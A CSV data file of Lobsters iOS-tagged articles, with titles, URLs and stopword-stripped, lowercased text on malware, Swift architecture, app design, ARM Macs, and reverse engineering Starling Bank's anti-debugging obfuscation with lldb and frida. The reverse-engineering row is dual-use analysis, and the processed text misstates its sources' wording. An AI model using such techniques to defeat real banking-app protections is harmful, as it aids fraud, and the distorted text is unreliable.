ID,Source,Tag_Code,Tag_Name,Title,Url,ProcessdedTitle,WeightedContent,Content
1,Lobsters,ios,Apple iOS,"The XCSSET Malware: Inserts Malicious Code Into Xcode Projects, Performs UXSS Backdoor Planting in Safari, and Leverages Two Zero-day Exploits",https://documents.trendmicro.com/assets/pdf/XCSSET_Technical_Brief.pdf,xcsset malware insert malicious code xcode project performs uxss backdoor planting safari leverage two zeroday exploit,,obj metadata rviewerpreferences r endobj obj endobj obj extgstate font procset pdftextimagebimagecimagei mediabox content rgroup tabssstructparents endobj obj stream
2,Lobsters,ios,Apple iOS,"Porting Redux Architecture to Swift (Well, for a Toy macOS App Anyway)",https://medium.com/insertgif/porting-redux-architecture-to-swift-well-for-a-toy-macos-app-anyway-ed61bad0395c,porting redux architecture swift well toy macos app anyway,porting redux architecture swift well toy macos app anyway insertgif store action testable debuggable easy understand easy reason store action store action app easily mutate store store action swift insertgif grand central dispatch grand central dispatch subscription higherorder reducer insertgif spectacle insertgif twitter producthunt originate,porting redux architecture swift well toy macos app anyway boy medium back day let sit rocking chair install modperl movabletype put something internet uppercased internet back liked walked told get back talking software architecture insertgifsoftware architecture exciting topic nobody else ever pontificated one nicer experience programming last year writing react component using redux unfamiliar web development talking much react redux little tutorial help know store action goal architect toy app testable debuggable easy understand easy reason idea separating store set action whatever word may mean declarative userinterface description html jsx cocoa view view controller rooted older idea separating data presentation one another behind cascading style sheet microsoft powerpoint different app microsoft word last one real making sure still paying attention scan header image blog post people critical reading skill way get pandemicstores actionswe define store location canonical representation data true know true current point time great definition try hard definition specific tell lielet say writing gui component show bank account part new bank account app store app would containall transaction renderedthe computed account balance iterate list transaction time instead n ya knowthe user avatar scroll page scrolled cover valuable information client wanted thought would spiffy app littlein kingdom javascript would represent store giant usually immutable object array string float object would want exact decimal banking app would look javascript work would sigh resign float action concrete object encode event relevant store either creating new version store requiring information store definition meant wideencompassing generic constitutes action really depends business logic patience write kinda boilerplatey code store action macos app might button clicka menu item clickthe user resized application windowa keypress happeneda keypress another app happenedan thread monitoring http request completed another threadmacos restartthe computer firebut promise something want mutate store must take place action first user want withdraw money bank balance app must first encode action action type withdrawal amount description buy new airpod old one fell chewing user uploads new avatar must make action type avataruploaded buffer containing jpeg data good implementation architecture macos application make difficult view view controller violate promise say app easily mutate store application scale include component data dependency becomes harder reason one nice aspect storeandactions architecture cheerfully named redux architecture get click link make change store explicit first change must encoded action function might call reducer must patternmatch stream action create new storestore action swiftif programmed io macos might degree recognize store another name core data managed object context le analogous store instead represented object graph encoding n n relationship giving u way project insert update delete node graph true would want unless good reason use core data application especially looking build team developer scale something approaching fancy macos app cost app storehowever let say want build toy app quickly something fun hacked together weekend yet still completely suck managing data perhaps encode store immutable object using swift struct integer also great way store decimal huh want design withdrawal first action might look like represent action using swift enum need fold stream action creating new version store along way redux represents part codebase take action produce new version immutable store reducer borrow terminology even though diction esoteric need let assume writing multiple reducer time like structure new feature ticket insertgif new reducer use protocol unify type level protocol would call interface language term come objectivec objectivec different objectivec like differentnote using swift value type structs first copy store nextstore update field new store returning common reducer code go ahead give helper make easier reason need inout keyword mutate new cloned store swift better immutable record update syntax would probably herethis banking code trustgrand central dispatch grand central dispatch write layer architecture construct store run reducer central location action dispatched handled imaginatively call dispatch view controller hook nsbutton dispatch every time user click withdraw button withdrawal action occurs real banking app would probably also want enter routing account number place withdrawing fun show blithely ignore aspect realworld bankingsome kinda cool immediate benefit get store action even extremely unrealistic example app business logic life reducer eminently testable need construct cocoa view run unit test reducer need mock storea great way debug app print action dispatch place xcode breakpoint possible external stimulus outside world pas time something unexpected happens able trace exact action caused ita common request product manager boss alike implement user analytics user click button user coming funnel user giving u information andor money write track reducer convert user behavior google analytics segment event making remote call event come fire forget minute form event sourcing friend s√∂nke point outas app grows becoming unruly moody want refactor feature adage write code easy delete believe reducer written way satisfies rule thumb drop action reducer use compiler list compiler error find usesites imagine written view controller directly read modified array transaction balance would audit location user action led mutation would also pull business logic entangled view codesubscriptionswith withdrawal feature place would like render screen app contains list transaction account balance user avatar javascript react component update automatically dependency store among change benefit componentized user interface cocoa still benefit thinking oneway dataflow store presentation data storedispatch already single place action flow take advantage architectural watering hole use invoke subscription first let u model subscription callable object c would call functor object hear saying computer remind c escaping keyword mark closure later use constrains kind closure passed parameter help prevent reference cycle life escaping cycle construct ourselvesas subscription come store array action occurs iterate array invoke subscription small wrinkle memoize projection store avoid unnecessary ui updatesthis work breaking subscription two map action like mapstatetoprops redux encourage view controller construct equatable object containing subset information store projection need action need fire time action occursin general strike central weakness storeandactions architecture difficult write performant app certain highfrequency action encoded object passed every reducer however toy app suffices fine also imagine app certain part app flee normal architecture manage state squeeze extra framesit remains implement subscriber generic variable exists know kind type view controller want represent state know need equatable implement inequality checknow use subscription reactively update cocoa view oh boy view controller easy writethis completes core loop architecture change happens user click withdraw one view controllerthe change packaged actiona reducer several handle action creates new storesubscribers invoked new storea second view controller subscribed store update viewsone last thing though multiple reducer higherorder reducersthis title book programming would sell bunch copy even though nobody would able understand alternate universe paid content make internet suppose universe need reducer multiplex action many reducer despite fancy title simple write could keep going bank app think would neat show actual list reducer look like insertgif give hint feature ticket wanted implement release app action shoutout opensource spectacle app wayeven toy app already kind complicated might posit writing user interface essentially hobby worry tiny detailsthat allgo check insertgif already also twitter producthunt keep updating long remember insertgif made love nyc proud alumnus originate r laboratory hope much fun reading individually creating gist medium sevenyear old product support syntax highlighting code block
3,Lobsters,ios,Apple iOS,A Best in Class iOS App,https://swiftjectivec.com/A-Best-in-Class-App/,best class io app,jordan morgan thing quantify help make app great accessibility platform technology user experience design app store presence accessibility first class rotor voice gesture escape magic tap threefinger scroll increment decrement voice control appropriate element add necessary subtitle audio track uiaccessibilitylocationdescriptors vision hearing physical motor literacy learning io technology tightly integrated lplinkview universal link touch face id user experience top mind native two finger drag edit gesture support field token viewdidappear determinate indeterminate view hiddenpreviewsbodyplaceholder background task compact environment design drip polish app store page logistical asset thoughtfully crafted wrapping,indie dev diary present written jordan morgan feb updated jul get public github issue version list updated reflect io long part industry watched incredible welldeserving apps take home apple design award endgame year ago set create list succinctly answer one question thing quantify help make app great believe created list help answer question might look different one mine attempt take emotion mostly opinion want capture apple say great people may define though opinion assuredly value give ada apple quick brief methodology behind created first importantly read io human interface guideline annually top bottom gm release upcoming version io list applies primarily latest version io ipados smoke fire apple said record great app include whatever thing interaction thing clandestine trade secret rather thing apple apple design evangelist publicly gave seal approval lastly remember largely yesno list part equation make truly great app innovation technology user experience come together enriching people day day interaction apps knowing us extremely well always got item two belongs list mean create pull request get added visiting link bottom post five section cover accessibility designing everyone right thing best apps exceptionally well platform technology apple love apps utilize new apis great effect shoehorning feature looking product seeing utilize io around user experience make people think app core function act thesis paper ux body support design explaining design hard know good one see section list thing apps thoughtfully created app store presence far nascent category tracking list short includes best practice app store accessibility first class voice fully supported rotor control implemented including relevant heading using screen curtain yield experience usable par regular app using voice voice gesture overridden necessary escape twofinger zshaped gesture dismisses modal dialog go back one level navigation hierarchy func accessibilityperformescape bool magic tap twofinger doubletap performs mostintended action func accessibilityperformmagictap bool threefinger scroll threefinger swipe scroll content vertically horizontally func accessibilityscroll direction uiaccessibilityscrolldirection bool increment onefinger swipe increment value element func accessibilityincrement decrement onefinger swipe decrement value element func accessibilitydecrement voice control also supported appropriate accessibilityuserinputlabels set needed app respect following setting including bold text high contrast cursor reduce transparency dark mode reducing motion presenting new controller set voice cursor appropriate element topmost left element make sense uiaccessibilitypostnotification screenchangednotification myheading context considering use accessibilityignoresinvertcolors image video punctuation spoken accessibility text use attributed string set accessibilityspeechpunctuation true group content logically using accessibility container efficient navigation adaptive support device multitasking scenario elegantly fully support dynamic type readable text us readablecontentguide color blind support color contrast ratio smart invert color support app responds well color inversion bar button landscapeimagephone largecontentsizeimage property set control grouped way make navigation trivial shouldgroupaccessibilitychildren already use system vended item common bar button quick action tab navigation bar item ie save done etc glyph accessibility image set ie adjustsimagesizeforaccessibilitycontentsizecategory includes closed caption audio description image icon alternative text set full rotor control support provided via uiaccessibilitycustomaction leading trailing margin used constraint support left right language got ui inherit uiview uicontrol leverage uiaccessibilityelement make accessible needed include video add necessary subtitle audio track user interface appears flawlessly tested using double length pseudolanguages using nsshownonlocalizedstrings yield result support drag drop uiaccessibilitylocationdescriptors set also leverage accessibilitydragsourcedescriptors accessibilitydroppointdescriptors modally presented view clear button available dismiss instead relying solely swipe gesture imessage sticker extension accessibility label provided magic tap supported app common functionality us cfbundlespokenname app name could potentially mispronounced system e would coolapp twenty three request permission io truly need hig request clearly related current context help people understand app intention end day considering building accessibility technology deal mac catalyst alternate pointer action slow key larger text header pointer speak screen guided access typing feedback full keyboard access assistive touch reduce motion voice control reachability live listen rtttty accessibility keyboard zoom magnifier voiceover sticky key switch control speak selection display accommodation audio description mouse key hover text large text braille dwell main thing address broadly vision hearing physical motor literacy learning lastly running entire app accessibility inspector produced warning turning screen curtain navigate app work flawlessly io technology tightly integrated contextual menu integrated long press showing preview appropriate find good balance include many option overwhelming use glyph reinforce action meaning edit menu used right place conflict context menu opt pull style menu action sheet use reduce modality throughout app keep focus squarely content action sheet still used confirm destructive action provides enough friction ensure user really want perform deletion also include cancel menu item canceling implicit action system provides tapping outside menu bound use menu disambiguation navigation selection showing option offer menu present power user functionality long pressing bar button necessary addition providing standard action tapping fully support dark mode multiple space scene support ipados leverage idea primary window versus auxiliary window one provides access full feature set help user complete focused singular task usually closed afterwards full multitasking support home screen quick action support offer sign sign apple included spotlight search indexing support custom uipointerinteraction support app need interface support cursor support correctly force interaction paradigm another ie touch viable pointer keyboard viceversa use correct content effect consistently highlight lift hover effective energy management ie support low power mode reacts keyboard shortcut added app could used almost completely solely use keyboard modifier key along mouse pointer click supported support handoff mac applicable meaningful extension included app whether via share extension action extension file provider sticker pack custom keyboard etc extension carefully thought example widget mini app strives provide glanceable actionable information table collection view cell make sense focus selectionfollowsfocus set callback url supplied documented apps may integrate xcallbackurl uimenucontroller support necessary via overriding uiresponderstandardeditactions supply custom icon enhance user personal connection app want display link consider using lplinkview deep siri intent support donate shortcut action user already taken suggest shortcut user shortcut apps section shortcut app suggesting invoiceshortcutcenter integrate wind make sense support shortcut include ui view also include intent phrase help coach user alternate app name included appropriate watchface support make sense document sharing supported via file provider drag drop first class support fully fleshed nsitemprovider exists custom object editable control data entry also accept content via drop used reordering app support drag make new window data could copied moved inserted duplicated also via drag drop make sense data shared via airdrop natural language processing support necessary tab bar image vector pdf image corresponding size included ensure adapt correctly vended accessibility modal properly displayed live photo animate force touched utilize phlivephotoimageview playback system specific feature live photo arkit experience use system badge indicate available ie live photo arkit badge make sense support printing via uiprintinteractioncontroller call uigraphicsbeginimagecontextwithoptions uigraphicsimagerenderer used instead universal link supported especially app content available online need secure data opt user touch face id vend useful interaction current context via uiactivity uiactivityviewcontroller relevant app supply app clip use system capability arkit lean platform defined convention help user get started example get arkit experience started typically use arcoachingoverlayview instead rolling solution finally running analyze function xcode yield error warning suggestion user experience top mind support native undo redo action typically shaking system defined gesture content type text view text field included correct keyboard type used current context keyboard language identifier integrated correctly support two finger drag edit gesture table collection view using custom input view place keyboard provide audible tap noise using uideviceplayinputclick got customized text input support uiscribbleinteraction customized back button image navigation controller also set backindicatortransitionmaskimage searching capability support field token handle keyboard undocked ipad view constrained via inputaccessoryview data quantifiable data transfer occurring progress indicator used activity indicator localized territory released text tends truncate never clip rather always readable tappable interface element least point entire app binary megabyte source based multitude data point delete action always followed confirmation prompt app store rich information file like keynote presentation us quick look api preview robust nsuseractivity support state restoration handoff drag drop creating new window core spotlight donating siri inintent us correct audio setting responds audio interruption gracefully audio played within custom edit option supported text image selected appropriate user provided ample time form opinion app request rating opt builtin skstorereviewcontroller ask launch screen branding free closely resembles first screen app displaying video using avplayerviewcontroller player display content original aspect ratio include extra padding around frame would cause video appear smaller fullscreen fittoscreen mode opening link could lead another app web view sfsafariviewcontroller try calling uiapplication openurl uiapplicationopenurloptionuniversallinksonly option first table view deselect selected row viewdidappear popping back loading data let user know progress operation either using determinate indeterminate view notification supply value hiddenpreviewsbodyplaceholder detail view also consider using short memorable sound make sense notification using unnotificationsound supply detail view expand context notification user accomplish task within notification without open app good thing also let user edit notification preference within app uitextinputassistantitem item used support common task ipad home within shortcut bar performing crud operation table collection view opt animate change using diffable datasource instead reloaddata testing leak freed memory part workflow consuming unnecessary amount memory power hamper everyone long running task keep ui free date using background task using system material accompany content contained within matching vibrancy effect ie mix match different semantic effect tend use system semantic color instead hard coding custom color adapt light dark mode increased contrast transparency reduction scenario also use semantic color consistent way redefine meaning ie use link label color defer providing custom gesture towards edge screen appropriate viewing medium override preferredscreenedgesdeferringsystemgestures needed user interface element constrained keyboard frame handle situation may undocked floating split support pencilkit include undo redo button compact environment additionally ensure systemwide double tap gesture modify content customized app navigation clear foolproof use either flat hierarchical contentux driven navigation use sidebar flatten information hierarchy make sense example app several folder playlist similar collection use tab bar aim item need tab likely going wrong direction modality used sparingly clearly brings back dismissed design also considers text app voice messaging part design experience stay consistent mix playful error message juxtaposed serious one io technology technical term made anyone understand ie use scan tag instead activate nfc reading session similar design drip polish correct system margin used throughout app hard coded one used ie layoutmarginsguide safearealayoutguide etc haptic feedback used throughout system complement user interaction overdone right haptics used right time example use selection selection change instead something like rigid example often accompany visual auditory feedback utilize sf symbol common io glyph apps running io later show dedicated one system apis ie glyph exclusively icloud usage use custom one custom glyph adapt well environment controller transition feel natural fluid great example calendar photo opt vector asset combat differing resolution avoid blurry asset content always focus constantly challenge true throughout development cycle particular specific user experience guideline followed segment control used toolbars five le option toolbars tab bar screen destructive action top choice action sheet alert used ideally two choice title punctuation avoid using yes choice need two choice opt action sheet picker height equal list value progress indicator bar unfolded portion track clear otherwise colored denote amount work left network activity indicator shown network request last second popover iphones avoided discard work user actively tap cancel button example someone tap outside popover work saved switch exclusively used within table list style collection view row page control always centered bottom screen aspire ship apple platform io iphone ipad watchos tvos macos animation tasteful reinforce introduce action confusing likely mimic real physical law general reduce modality possible keep focus content supply highresolution asset image use right asset format given scenario png icon bitmapraster artwork jpeg photo pdf glyph vector artwork controller specific configuration thoughtfully implemented status bar hidden exchange equal value pointer locking occurs boost experience home indicator hidden rich medium experience full width button respect uikit margin extend edge edge screen color used denote value purpose provide mixed signal example enabled disabled control colored red triangle conveys problem red used everywhere else app create rich medium apps apps primarily used reading watching provide sensible value uiwhitepointadaptivitystyle adjust along true tone handle color management well ensure color display fine srgb device app voice use consistently example app strike formal tone display error message text overtly place humorous opt lean system font better support size improve legibility consistency custom font provides value direct purpose used system font also work weight dynamic type size lastly app jank free know mean app store page logistical asset thoughtfully crafted app store preview video used keywords category carefully researched link privacy policy provided supported territory localized app icon follows golden grid likely include brand primary color well embrace simplicity conveys app main idea supply size needed spotlight setting etc otherwise io shrink app store icon ideal wrapping love checklist quality checklist constantly evolving one main reason created spend stack see could get state meet exceeds almost every single bullet point certainly quality take time nailed everything list working towards year close meeting item listed stress also mean probably shipped take piece piece work way wise honeyloving bear said get going walking away app might lack polish better ever spend time giving next time
4,Lobsters,ios,Apple iOS,The Promise vs Reality of SwiftUI Multiplatform,https://write.as/angelo/the-promise-vs-reality-of-swiftui-multiplatform,promise v reality swiftui multiplatform,last week post tweeted letdown swiftui illustrated broken button reality multiplatform via r,happy august friend update last week post swiftui app writefreely work progressed pretty well shared code last week point got preliminary ui display list post filter collection tapping post load editor make change title content iphone ipad also new post button create new draft iphone ipad well pull chair let chat little bit gap promise reality multiplatform swiftui apps working post tweeted managed flesh key ui feature app across iphone ipad mac day thanks swiftui live preview xcode show view look like next code update realtime code stated building native app speed iteration ever encountered building web looking html cs looking react latest iteration look like far iphone ipad installed macos aka big sur beta able build mac app compare way final ui plenty work still done including replacing unusual picker view selecting collection proper sidebar adapting spacing little better mac app ca nt preview anything mac target even xcode upgrade machine macos beta one thing helpful moving quickly swiftui declarative nature let specify semantics element placement view letting framework figure mean iphone v ipad v mac great example focus developer experience dx toolbaritemplacement api let semantically state particular item add toolbar primaryaction status element used texteditor view place post status badge status area publish button primaryaction area see screenshots shared element placed differently depending whether shown iphone ipad mac nt write single line code customize difference letdown swiftui illustrated broken button life swiftui rose newdraft feature nt quite working fully yet building iphone ipad version app tapping newdraft button list post work beautifully slide new draft list open text editor next great essay thrilled working end workday friday finished installing big sur beta mac morning excited see everything looked worked mac app expected little ui refinement list post example need healthy dose padding otherwise figured similar experience least ipad app mostly picker replaced popup menu choose collection narrow list post tap post list load text editor ready change post status change instantly update badge toolbar post list tried create new draft mac clicking newdraft button appears interestingly enough next poststatus badge screenshot nothing thing error thrown view drawn nothing reality multiplatform suppose nt use word letdown multiplatform panacea reality app expects different thing iphone ipad mac issue facing newdraft button nt failing swiftui paradigm mac app treat navigation v button v instantiating new window different iphone nt structured thing way framework expects fine need spend little time adapting mac client would liked got say despite couple little issue need fix really impressed much worked right box extra work part nativeapp development may yet happen pace web development closer ever enter email subscribe update also subscribe via r follow angelo writeas mastodon
6,Lobsters,ios,Apple iOS,"Apple, ARM, and What It Means",https://www.ifixit.com/News/42949/apple-arm-and-what-it-means,apple arm mean,htomariflickr note syonyk project blog apple transition arm possibility apple moving arm processor apple modern phone processor started giving intel offering solid competitor really happened arm huh instruction set architecture powerpc powerpc intel opcodes quite riscv intel amd power netbooks intel sdm arm small powerefficient cheap good enough apple arm big powerefficient intel stuck broken microarchitecture process slipped yet broken term security netburst sgx enclave terminal faultforeshadow apple arm advantage security processor shipping carryon luggage roughly nowhere arm emulation rosetta provide integrated emulation virtualization goodbye native window performance mikrotik winbox software ecosystem yay raspberry pi raspberry pi raspberry pi jetson nano intel future moore law iphone review,photo htomariflickr note guest post russell graf writes computer project syonyk project blog edited version post apple transition arm found interesting view necessarily represent ifixit past year apple mac run intel processor using architecture competing pc meanwhile apple used arm processor mobile device ever since first iphone apple often seemed stymied intel slower pace innovation compared large stride mobile power year people discussing possibility apple moving arm processor desktop laptop reinvention read like something open question sure thing ever since apple modern phone processor started giving intel offering solid competitor really happened apple use custombuilt arm processor power macbooks point probably imacs mac pro lot people seem confused really mean know way around deep processor weed interesting ton uninformed garbage internet usual offer attempt clarify thing arm huh apple third major instruction set architecture isa transition history moved powerpc powerpc intel arm make pretty much consumer hardware company regularly change processor architecture certainly largest pull consistently instruction set nearly lowest level language processor speaks defines opcodes execute gut processor quite throughout history computing adding two number loading value memory deciding instruction execute next talking external hardware defined isa modern world consumer computing two matter though arm sorry riscv yet recently division simple processor intel amd ran desktop laptop server arm processor ran phone tablet printer everything else except loon like insisted reason making little arm computer function desktop thing worked anymore intel amd power decade king performance hill chip intel amd within rounding implementation pentium core athlon xeon powerhouse run office application run game run giant datacenters run internet fast powerful intel king though amd made proper nuisance regular basis fact extension probably running developed amd licensed intel powersipping atom processor netbooks massive xeons opterons data center covered default long desktop server people even think isa year old introduced accumulated lot cruft baggage year instruction maddeningly complex sort weird corner nasty gotchas gotten worse time mmx sse vmx tsx sgx txt smm stm either idea shuddering bit internally add go read intel sdm fun bored enjoyable also pretty darn complicated arm small powerefficient cheap historically arm architecture lowerpower far cheaper powerefficient alternative set fairly small cheap make powerefficient focused blazingfast performance usually good enough result ended everything desktop laptop last year two arm chip started firing solid cannon blast across bow intel xeon chip datacenter care raw singlethreaded performance care awful lot total throughput power efficiency arm server chip properly impressive le money xeon computing power fewer watt bad arm chip made way laptop desktop threat flagship performance intel apple occasion totally insane interesting way apple arm big powerefficient fast company license arm reference core etc attach desired peripheral resulting arm chip run fast company arm chip core clock rate company proper license engineering staff build totally custom arm core apple one company starting processor iphone used custom processor implementation arm processor sure reference arm processor implementation first fairly impressive time clearly phone chip meant save power run cool apple got crazy iphone probably faster anything else house term singlethreaded mere watt apple quietly iterating custom arm core created something properly barely anyone noticing meantime yeah review score got impressive year yeah modern android device stomped iphone anything massively phone threaten desktop laptop laptop far thermal capacity power offer one apple chip phone iphone battery working new macbook pro battery making time larger go screen good bit power throw computing plug computer well power problem interesting also intel found stuck intel stuck broken microarchitecture kept intel last year none surprise might notice seem produce strikingly similar processor every year sometimes month intel stuck process year plan slipped yet microarchitecture fundamentally broken term security worse fully understand chip anymore yes intel iterating releasing improvement okay made last two everyone else leapfrogged intel used unquestioned lead rest tech industry building chip showed intel chip post netburst used le power gave performance anything else solid chip performed well worth money case lost lead lost lead previous chip getting slower age might heard meltdown spectre camel nose laundry list issue recently discovered flaw microcode update software recompilation kernel workarounds workarounds slow processor haswell processor today run code slowly came whoop finally intel reason chip anymore seem unable fully understand chip know know quite regularly microarchitectural vulnerability come rip open secure sgx worst terminal faultforeshadow fix cache enclave transition hit processing speed dealbreaker point intel know problem told would want chained intel anymore good reason amd caught apple move one thirdparty vendor another pulling interesting apple arm advantage custombuilt arm chip give apple better control stack translate rather nicely better user experience least user apple able deliver performance le bargain able integrate stuff chip even power saving need separate security processor build main processor die stuck dealing whatever integrated gpu abomination intel dumped generation design chip need hardware acceleration stuff care yes know intel bad used sincerely doubt apple happy integrated gpus fewer chip also mean smaller generally mean le power consumption better performance important ever apple literally sitting limit much battery laptop claim laptop disclaimer might ask wrong battery warrant disclaimer saying actually le lot shipping carryon luggage regulation use usually phrased le apple explicitly clear laptop le advertise equal usps shipping ups something say battery ship battery essentially declare hazardous material customerfriendly scene apple literally put battery laptop expect ship inexpensively let people travel easily way increase runtime reduce power use apple arm chip almost certainly use le power intel chip work apple might keeping tradition use custom chip offer smaller lighter laptop battery nobody else touch either way bold move set apart rest industry stuck intel longer microsoft arm ambition gone roughly nowhere linuxonly hardware big seller outside chromebooks apple also gain lot able put stuff io device laptop think machine learning accelerator neural network engine speech recognition gap iphone macbook pro ought narrow significantly might even see return laptop builtin cellular modem arm emulation sticking point apple switching arm first foremost current mac based happens existing software switching arm mean software work without translation turn apple massive amount experience exactly sort thing made binary run fine powerpc made powerpc binary run acceptably rosetta provide integrated emulation emulating hard especially want fast lot work time jit space thing like javascript apple emulation expect jit engine used infrequently real performance come binary binary source code get turned arm binary let figure weirder feature like flag register updated every instruction needed ignored one could also bit work figure arm rather relaxed memory model compared cause problem build barrier easy certainly type thing apple done sound like rosetta continue trend would interesting though think apple might pull would going native library call recompiling program know code going call apple library function got bit creative emulated software could jump emulated application code native library code would gain lot performance back thing apple library lot would native performance virtualization goodbye native window performance next question least subset user virtual machine well arm support virtualization want run linux vm run arm linux vm need application say window interesting watch fully expect solution year ago ran window powerpc hardware know sort performance get full system emulation arm normally thing gone way emulate slow arm system fast machine performance great good enough going way though nobody really tried never really fast arm chip mess course apple chip faster comparable intel chip spend time emulation maybe come even ahead hoping run weird utility mikrotik winbox come mind sort thing run sure good enough solution maybe light fire microsoft fix arm version window emulator game probably sorry software ecosystem yay though really excited something almost nobody else care software ecosystem going get fixed fast playing arm desktop pi raspberry pi raspberry pi jetson nano swell interest use raspberry pi armbased chromebooks similar device made living arm tolerable daytoday livable stuff though software build randomly fail clearly little development polishing end thing like signal building arm ancient dependency nested inside node dependency know mean apple moving highend arm space expect fast great news light arm system even personally macbook intel future leave intel depends bit good apple soon intel get back track intel iterates quickly get process working fix underlying microarchitecture properly instead using university r dqa lab good decade back forth apple team excellent intel well used excellent least certainly got resource throw crash headlong brick wall end moore law getting creative ideally way leak secret going important could end something like state phone anandtech iphone review benchmark latest flagship web performance top go apple apple previous generation apple generation big gap rest pack yes mention iphone desktop grade chip term spec benchmark performance could laptopdesktop market look bad probably possibility really depends apple chip designer waiting wing someone finally said watt play apple moving away intel data center working arm option cheaper buy cheaper run faster bargain intel might hard hill may make back
7,Lobsters,ios,Apple iOS,Reverse Engineering Starling Bank (Part I): Obfuscation Techniques,https://hot3eed.github.io/2020/07/30/starling_p1_obfuscations.html,reverse engineering starling bank part obfuscation technique,reverse engineering starling bank part obfuscation technique control flow obfuscation technique opaque predicate done right instruction alias instruction substitution function inlining data flow obfuscation technique multiple stack pointer register literal tunneling deal manual approach singlestep way poor man frida stalker next,reverse engineering starling bank part obfuscation technique uk bank seem earned reputation tight starling one good example launch starling binary version io jailbroken device debugger crash could tell crashlog gon na interesting binary exception type excbadaccess sigbus exception subtype kernprotectionfailure exception code culprit unknown vm protection rw triggered thread thread name dispatch queue comapplemainthread call stack libdylddylib start strange callee dyld start crash binary look like heap address besides quirk backtrace also bit misleading see later first decrypt binary launch luckily let try see happens main need spawn binary debugger first lldb debugserver x backboard starling lldb b mainaddr lldb c binary stop main good continuing expected crash process stopped thread queue comapplemainthread stop reason excbadaccess frame udf udf udf crash strange heap pointer let see backtrace lldb bt thread queue comapplemainthread stop reason excbadaccess frame frame starling starling frame libdylddylib start crashlog misleading see point binary crash happens good somewhere least instruction tell gon na considerably obfuscated let see block leading crash ldr adrp add add str blr safely assume happens something environment ie debugger jailbreak trigger something function logic trigger get know met strong arsenal obfuscation technique control flow obfuscation technique opaque predicate done right opaque predicate staple obfuscation highprofile apps reversed rarely done right usually inserted identical selfcontained block block original code become easy recognize play binary short binary different beast identical selfcontained make extensive use stack variable always clear anymore whether branch taken due opaque predicate legit constraint binary snapchat opaque joke compared let see real example mov stur b couple block later ldur str sub sub cset lt strb mov practically dead code str opaque predicate start b somewhere finally decision made ldr str sub sub blt somewhere never taken b somewhere always taken add enough becomes considerably hard distinguish original code behaviordata solution execution trace see later easy usually instruction alias lookup cmp page find alias sub subtract set flag tst ands instead giving conveneince understandable alias give original one sub ands know else big deal anyway instruction substitution another popular technique substitute simple instruction others semantics example str xzr ldr noticed equivalent movz function inlining function inlining another popular technique good job function work control data flow obfuscation basically blur line function instead convenient one container reverse engineered know normal function great help argument return value give hint function could plus reverse function one context normally reverse another context technique definitely made function way harder work data flow obfuscation technique team starling seems focused hiding stack variable right thing function like multiple stack pointer register stack offset useful identifying variable interested seeing action usually sp register used access stack variable binary though couple register used hide offset happens multiple base actually pointer offset used access value would change add sp add sp two instruction usually separate block far away one convenience add bl somefunc let access via ldr solution watchpoints address remains although using binary analysis frameworkemulator resolve nonsp stack pointer would cool easy literal tunneling know technique already name let coin call tunneling similar tunneling protocol important return value syscall example obviously gon na check want check trivial bypass store stack offset couple block later load store another stack offset block later since block sequential memory hard tell check made original value unless using debugger looking execution trace example svc mov stur retval redacted block logic ldur retval stur retval b somwhere couple block later ldur retval stur retval redacted block logic decision finally made ldur retval redacted logic cbz somewhere retval redacted block logic simplicity binary block come clearcut deal manual approach working binary like begin understand done usually idea deobfuscate using symbolic execution tainting slicing fancy reverse engineering time management usually delay investing time find manual approach time intensive almost always manual approach win make progress resorting approach binary exception manual mean debugger disassembler possibly execution trace singlestep way obfuscation mind two thing contribute making function quite tricky reverse opaque predicate function inlining string obfuscated opaque predicate used heavily maybe halfish instruction bogus loop check considerable amount file find swimming sea assembly opaque predicate usual way singlestepping reversing c practical frida stalker would naturally way go poor man frida stalker tried spawn starling using frida script stalk main crashed expected give execution trace crash wanted frida u f ukcostarlingbankstarling l mainstalkjs iphone ukcostarlingbankstarling resume crashlog iphone ukcostarlingbankstarling started stalking main process crashed bus error thought write atrocious singlestepper python plugin lldb log instruction terribly slow execution trace huge huge fact impractical log whole thing one go gave wanted wonder much faster plugin would might bad idea could even call creep next jailbreak debugger detection technique weakness mitigation
8,Lobsters,ios,Apple iOS,Replicating Safari's Link Preview Animation,https://shadowfacts.net/2020/uipreviewparameters-textlinerects/,replicating safari link preview animation,snapshot view mask,io apple replaced peek pop force touch system new context menu preview new preview fancy animation appear expand content onto screen back first replaced preview tusker new context menu year ago shortly wanted replicate behavior safari link mention post body time pretty much zero official documentation new context menu apis decided wait either apple publish doc someone else figure first come gone working little bit time year finally fully working implementation safari behavior look like animation slowed singleline link one span multiple line look pretty much like expect singleline case text link appears inside sort bubble animates link preview multiline link pretty similar two bubble contains part link respective line text fragment overlapped horizontally two bubble would merged together default nt provide custom preview uikit simply display entire view animation nt look great particularly long piece text link may small portion highlighting link text look much better let see take reimplement behavior safari first little bit custom preview work contextmenuinteraction previewforhighlightingmenuwithconfiguration method provide custom uitargetedpreview describing configuration preview take view displayed preview preview parameter object preview target object preview parameter describe preview displayed preview target defines view preview view within inside view anchored previewforhighlightingmenuwithconfiguration method need construct assemble targeted preview obvious starting place uipreviewparameters textlinerects initializer since directly deal behavior trying replicate take array cgrects wrapped nsvalues representing rectangle occupied text one rect per line text coordinate space preview view uitextview subclass coretext stack already setup directly access nslayoutmanager handy method called enumerateenclosingrects forglyphrange withinselectedglyphrange take range text give u access rectangle text occupies use method need get link range somewhere since context menu interaction previewforhighlightingmenuwithconfiguration method could ask location within ourself find link range point would duplicating work done almost immediately contextmenuinteraction configurationformenuatlocation method instead store link range private property text view subclass configurationformenuatlocation method retrieve previewforhighlightingmenuwithconfiguration code assumes already exists method called getlinkrangeatpoint take point inside text view return range link span one private var currentpreviewedlinkrange nsrange func contextmenuinteraction interaction uicontextmenuinteraction configurationformenuatlocation location cgpoint uicontextmenuconfiguration guard let range selfgetlinkrangeatpoint location else return nil selfcurrentpreviewedlinkrange return contextmenuinteraction previewforhighlightingmenuwithconfiguration method grab stored range get creating preview returning nil method simply use default preview configuration showing entire text view preview animation reasonable fallback reason link range func contextmenuinteraction interaction uicontextmenuinteraction previewforhighlightingmenuwithconfiguration configuration uicontextmenuconfiguration uitargetedpreview guard let linkrange currentpreviewedlinkrange else return nil currentpreviewedlinkrange nil link range use enumerateenclosingrects method text view layout manager use rectangle construct preview parameter object let notfoundrange nsrange location nsnotfound length var textlinerects cgrect selflayoutmanagerenumerateenclosingrects forglyphrange linkrange withinselectedglyphrange notfoundrange selftextcontainer rect stop textlinerectsappend rect let parameter uipreviewparameters textlinerects textlinerects nsvalue finally got text line rects preview parameter move next piece puzzle view going shown preview animation might think could use self preview view work animation running preview view removed regular view hierarchy meaning rest text would disappear animation running since later use self target preview 